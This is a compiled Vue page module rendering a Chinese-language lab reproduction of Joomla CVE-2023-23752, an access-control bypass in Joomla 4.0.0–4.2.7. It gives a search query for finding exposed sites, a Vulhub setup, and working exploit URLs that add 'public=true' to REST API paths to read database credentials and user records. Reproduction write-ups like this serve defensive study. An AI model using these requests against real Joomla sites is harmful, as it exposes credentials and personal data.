import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as l,a as e,b as a,d as i,e as c}from"./app-58e4a7d6.js";const d={},s=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Joomla是一个开源免费的内容管理系统（CMS），基于PHP开发。",-1),u=e("p",null,"在其4.0.0版本到4.2.7版本中，存在一处属性覆盖漏洞，导致攻击者可以通过恶意请求绕过权限检查，访问任意Rest API。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://xz.aliyun.com/t/12175",target:"_blank",rel:"noopener noreferrer"},b={href:"https://vulncheck.com/blog/joomla-for-rce",target:"_blank",rel:"noopener noreferrer"},_=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Joomla 4.0.0 - 4.2.7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Joomla&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Joomla 4.2.7：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8080</code>即可查看到Joomla页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230410085613826.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这个漏洞是由于错误的属性覆盖导致的，攻击者可以通过在访问Rest API时传入参数<code>public=true</code>来绕过权限校验。</p><p>比如，访问下面这个链接即可读取所有配置项，包括数据库连接用户名和密码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/api/index.php/v1/config/application?public=true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230410085938073.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果不添加<code>public=true</code>，则访问会被拒绝：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230410090110901.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问下面这个链接即可读取所有用户信息，包含邮箱等：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/api/index.php/v1/users?public=true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,18);function v(x,f){const t=r("ExternalLinkIcon");return o(),l("div",null,[s,p,u,h,e("ul",null,[e("li",null,[e("a",m,[a("https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html"),i(t)])]),e("li",null,[e("a",g,[a("https://xz.aliyun.com/t/12175"),i(t)])]),e("li",null,[e("a",b,[a("https://vulncheck.com/blog/joomla-for-rce"),i(t)])])]),_])}const J=n(d,[["render",v],["__file","Joomla application 权限绕过漏洞 CVE-2023-23752.html.vue"]]);export{J as default};
